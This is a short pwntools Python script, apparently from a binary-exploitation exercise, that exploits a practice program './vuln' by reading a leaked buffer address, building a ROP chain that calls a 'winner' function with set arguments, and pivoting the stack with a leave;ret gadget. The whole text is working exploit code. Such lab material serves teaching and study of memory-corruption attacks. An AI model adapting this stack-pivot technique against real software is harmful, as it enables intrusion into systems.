from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
    0x0,               # rbp
    POP_RDI,
    0xdeadbeef,
    POP_RSI_R15,
    0xdeadc0de,
    0x0,
    elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (just get to RBP)

payload += flat(
    buffer,
    LEAVE_RET
)

pause()
p.sendline(payload)
print(p.recvline())
